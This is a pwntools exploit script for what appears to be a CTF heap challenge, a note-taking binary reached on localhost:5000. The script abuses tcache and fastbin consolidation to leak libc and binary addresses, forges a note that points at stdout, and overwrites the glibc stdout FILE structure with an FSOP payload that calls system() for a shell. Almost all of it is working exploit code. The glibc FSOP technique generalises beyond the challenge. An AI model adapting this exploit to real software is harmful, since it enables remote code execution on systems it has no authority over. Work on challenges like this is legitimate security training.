#!/usr/bin/env python3

from pwn import *

exe = ELF("chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
    elif args.GDB:
        r = gdb.debug([exe.path])
    else:
        r = remote("localhost", 5000)

    return r

# generic fsop payload to get rce
def brother_may_I_have_some_oats(fp_addr):
    fp = FileStructure(null=fp_addr+0x68)
    fp.flags = 0x687320
    fp._IO_read_ptr = 0x0
    fp._IO_write_base = 0x0
    fp._IO_write_ptr = 0x1
    fp._wide_data = fp_addr-0x10
    payload = bytes(fp)
    payload = payload[:0xc8] + p64(libc.sym['system']) + p64(fp_addr + 0x60)
    payload += p64(libc.sym['_IO_wfile_jumps'])
    return payload

def main():
    r = conn()

    def create(type):
        r.recvuntil(b'Enter your choice: ')
        r.sendline(b'1')
        r.sendline(str(type))
        
    
    def setnote(id):
        r.recvuntil(b'Enter your choice: ')
        r.sendline(b'3')
        r.sendline(str(id))
    
    def setnotecontent(id, content):
        setnote(id)
        r.sendline(content)
    
    def display(id):
        r.recvuntil(b'Enter your choice: ')
        r.sendline(b'4')
        r.sendline(str(id))
    
    def delete(id):
        r.recvuntil(b'Enter your choice: ')
        r.sendline(b'5')
        r.sendline(str(id))

    # create random notes to fill tcache with chunks that has pointers inside of it
    for i in range(9):
        create(1)
        setnote(i)
    
    # now tcache is filled and 2 fastbin chunks
    for i in range(9):
        delete(0)

    # create a dynamic note
    create(3)
    # cause large allocation to consolidate the 2 fastbin chunks into 1 whose size fits the fixed note
    setnotecontent(0, b'a'*0x10000)

    # get leaks
    create(2)
    display(1)

    # note that fixed note does not null terminate
    setnotecontent(1, b'a'*8)
    display(1)
    r.recvuntil(b'Note content: ')
    libc.address = u64(r.recvline().strip().ljust(8, b'\0')) - 0x7f3f05585b50 + 0x7f3f05382000
    print(hex(libc.address))

    r.recvuntil(b'aaaaaaaa')
    exe.address = (u64(r.recvline().strip().ljust(8, b'\0')) - 0x0005275) & 0xfffffffffffff000
    print(hex(exe.address))

    # create a fake dynamic note that points to stdout
    setnotecontent(0, p64(exe.address + 0x08ca0) + p64(libc.symbols['_IO_2_1_stdout_']) + p64(0x1000) + p64(0x2000))

    # overwrite stdout
    setnotecontent(-35, brother_may_I_have_some_oats(libc.symbols['_IO_2_1_stdout_']))

    # win
    r.interactive()


if __name__ == "__main__":
    main()
